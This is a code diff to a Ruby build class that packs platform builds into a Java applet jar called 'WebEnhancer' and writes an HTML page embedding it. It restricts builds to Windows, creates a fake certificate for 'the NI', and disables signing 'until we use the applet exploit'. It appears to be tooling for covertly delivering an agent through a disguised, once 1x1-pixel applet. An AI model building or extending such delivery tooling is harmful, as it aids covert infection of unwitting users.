@@ -18,6 +18,9 @@ class BuildApplet < Build
   def generate(params)
     trace :debug, "Build: generate: #{params}"
 
+    # TODO: remove when macos is supported again
+    params['platforms'] = ['windows']
+
     params['platforms'].each do |platform|
       build = Build.factory(platform.to_sym)
 
@@ -62,14 +65,27 @@ class BuildApplet < Build
     File.rename path('output_windows'), path('win') if File.exist? path('output_windows')
 
     CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} win", {:chdir => path('')} if File.exist? path('win')
-    CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} mac", {:chdir => path('')} if File.exist? path('mac')
+    # TODO: remove when macos is supported again
+    #CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} mac", {:chdir => path('')} if File.exist? path('mac')
 
-    File.open(path(@appname + '.html'), 'wb') {|f| f.write "<applet width='1' height='1' code=WebEnhancer archive='#{@appname}.jar'></applet>"}
+    # prepare the html file
+    index_content = File.open(path('WebEnhancer.html'), 'rb') {|f| f.read}
+    index_content.gsub!('[:APPNAME:]', @appname)
+    File.open(path(@appname + '.html'), 'wb') {|f| f.write index_content}
 
     @outputs = [@appname + '.jar', @appname + '.html']
   end
 
   def sign(params)
+
+    # this file is needed by the NI. create a fake one.
+    File.open(path(@appname + '.cer'), 'wb') {|f| f.write 'placeholder'}
+    @outputs << @appname + '.cer'
+
+    #
+    # the signing is not needed anymore until we use the applet exploit
+    #
+=begin
     trace :debug, "Build: signing with #{Config::CERT_DIR}/applet.keystore"
 
     jar = path(@outputs.first)
@@ -84,6 +100,7 @@ class BuildApplet < Build
     raise "keytool export failed" unless File.exist? cert
 
     @outputs << @appname + '.cer'
+=end
   end
 
   def pack(params)
